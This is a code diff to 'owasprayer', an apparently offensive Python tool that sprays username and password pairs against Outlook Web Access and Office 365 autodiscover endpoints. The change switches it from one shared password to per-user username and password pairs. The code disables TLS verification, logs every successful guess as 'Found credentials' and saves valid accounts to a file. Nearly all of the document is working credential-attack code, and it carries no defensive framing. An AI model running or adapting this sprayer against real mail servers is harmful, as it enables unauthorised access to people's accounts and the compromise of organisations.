@@ -7,9 +7,8 @@ from core.utils.messages import *
 
 
 class OWA:
-    def __init__(self, target, password):
+    def __init__(self, target):
         self.url = target if target.startswith('https://') or target.startswith('http://') else None
-        self.password = password
         self.domain = target if not self.url else None
         self.log = logging.getLogger('owasprayer')
         self.valid_accounts = set()
@@ -54,8 +53,8 @@ class OWA:
 
     def shutdown(self):
         with open('owa_valid_accounts.txt', 'a+') as account_file:
-            for email in self.valid_accounts:
-                account_file.write(email + '\n')
+            for username in self.valid_accounts:
+                account_file.write(username + '\n')
 
         self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to owa_valid_accounts.txt"))
 
@@ -84,22 +83,23 @@ class OWA:
             except ConnectionError:
                 continue
 
-    def auth_O365(self, email):
-        log = logging.getLogger(f"auth_owa_O365({email})")
+    def auth_O365(self, username, password):
+        log = logging.getLogger(f"auth_owa_O365({username})")
 
         headers = {"Content-Type": "text/xml"}
-        r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(email, self.password), verify=False)
+        r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(username, password), verify=False)
         if r.status_code == 200:
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            log.info(print_good(f"Found credentials: {username}:{password}"))
         else:
-            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
+            log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
 
-    def auth(self, email):
-        log = logging.getLogger(f"auth_owa({email})")
+    def auth(self, username, password):
+        log = logging.getLogger(f"auth_owa({username})")
 
         headers = {"Content-Type": "text/xml"}
-        r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(f'{self.netbios_domain}\\{email}', self.password), verify=False)
+        #r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(f'{self.netbios_domain}\\{username}', password), verify=False)
+        r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(username, password), verify=False)
         if r.status_code == 200:
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            log.info(print_good(f"Found credentials: {username}:{password}"))
         else:
-            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
+            log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
